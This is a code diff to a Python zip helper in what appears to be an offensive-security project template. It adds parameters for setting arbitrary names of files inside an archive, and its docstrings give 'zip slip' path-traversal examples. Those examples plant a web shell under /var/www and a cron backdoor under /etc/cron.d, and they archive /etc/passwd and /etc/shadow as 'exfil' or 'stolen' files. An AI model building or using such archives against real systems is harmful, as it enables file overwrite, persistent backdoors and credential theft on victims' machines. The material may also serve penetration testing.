@@ -15,13 +15,16 @@ from pathlib import Path
 from {{cookiecutter.project_slug}}.utils.output import out
 
 
-def zip_file(file_path, output_path=None):
+def zip_file(file_path, output_path=None, name_in_zip=None):
     """
     Zip a single file (can be from another directory).
 
     Args:
         file_path: Path to the file to zip (str or Path)
         output_path: Where to save the zip (defaults to file_name.zip in current dir)
+        name_in_zip: Name of file inside the zip (defaults to filename only)
+                     Can include path traversal for zip slip: '../../../etc/crontab'
+                     Maps to 'arcname' parameter in zipfile library
 
     Returns:
         Path to the created zip file
@@ -29,6 +32,9 @@ def zip_file(file_path, output_path=None):
     Example:
         zip_file('/etc/passwd', 'stolen_passwd.zip')
         zip_file('../secret.txt')  # Creates secret.zip in current dir
+
+        # Zip slip - file extracts to ../../../evil.sh
+        zip_file('payload.sh', 'malicious.zip', name_in_zip='../../../evil.sh')
     """
     file_path = Path(file_path)
 
@@ -46,12 +52,17 @@ def zip_file(file_path, output_path=None):
     else:
         output_path = Path(output_path)
 
+    # Default name_in_zip: just the filename (not full path)
+    if name_in_zip is None:
+        name_in_zip = file_path.name
+
     try:
         with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zf:
-            # Add file with just its name (not full path) inside the zip
-            zf.write(file_path, arcname=file_path.name)
+            # Add file with specified name inside the zip
+            zf.write(file_path, arcname=name_in_zip)
 
         out.success(f"Zipped {file_path} -> {output_path}")
+        out.info(f"Name in zip: {name_in_zip}")
         out.debug(f"Size: {output_path.stat().st_size} bytes")
         return output_path
 
@@ -138,26 +149,42 @@ def quick_zip(path, output=None):
         return None
 
 
-def zip_multiple(paths, output_path="archive.zip"):
+def zip_multiple(paths, output_path="archive.zip", names_in_zip=None):
     """
     Zip multiple files/folders into a single archive.
 
     Args:
         paths: List of paths (can mix files and folders)
         output_path: Where to save the zip
+        names_in_zip: Optional list of custom names for files in zip (must match paths length)
+                      Can include path traversal for zip slip attacks
+                      Maps to 'arcname' parameter in zipfile library
+                      If None, uses default naming
 
     Returns:
         Path to created zip file or None
 
     Example:
-        zip_multiple(['/etc/passwd', '/etc/shadow', '/home/user/.ssh/'], 'exfil.zip')
+        # Normal usage
+        zip_multiple(['/etc/passwd', '/etc/shadow'], 'exfil.zip')
+
+        # With custom names (zip slip)
+        zip_multiple(
+            ['payload1.txt', 'payload2.txt'],
+            'malicious.zip',
+            names_in_zip=['../../../var/www/shell.php', '../../../../etc/cron.d/backdoor']
+        )
     """
     output_path = Path(output_path)
+
+    if names_in_zip is not None and len(names_in_zip) != len(paths):
+        out.error(f"names_in_zip length ({len(names_in_zip)}) must match paths length ({len(paths)})")
+        return None
 
     try:
         file_count = 0
         with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zf:
-            for p in paths:
+            for idx, p in enumerate(paths):
                 path = Path(p)
 
                 if not path.exists():
@@ -165,11 +192,16 @@ def zip_multiple(paths, output_path="archive.zip"):
                     continue
 
                 if path.is_file():
-                    zf.write(path, arcname=path.name)
+                    # Use custom name_in_zip if provided, otherwise use filename
+                    arcname = names_in_zip[idx] if names_in_zip else path.name
+                    zf.write(path, arcname=arcname)
                     file_count += 1
-                    out.debug(f"Added file: {path.name}")
+                    out.debug(f"Added file: {path.name} -> {arcname}")
 
                 elif path.is_dir():
+                    if names_in_zip:
+                        out.warning(f"Skipping folder (names_in_zip only work with files): {path}")
+                        continue
                     # Add folder with its name as prefix
                     for file in path.rglob('*'):
                         if file.is_file():
